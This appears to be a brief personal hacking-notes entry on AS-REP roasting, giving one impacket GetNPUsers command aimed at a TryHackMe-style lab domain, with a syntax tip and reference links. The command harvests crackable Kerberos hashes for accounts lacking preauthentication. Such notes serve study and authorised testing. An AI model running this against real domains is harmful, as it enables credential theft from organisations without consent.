# impacket ASREP roast with Get-NPUsers
note that the domain must end in a /
```bash
impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
```

# References
- [20221003150600](/zet/20221003150600/README.md) impacket
- ~/kb/hacking/commands/impacket-commands.md

Tags:
    #assorted #command
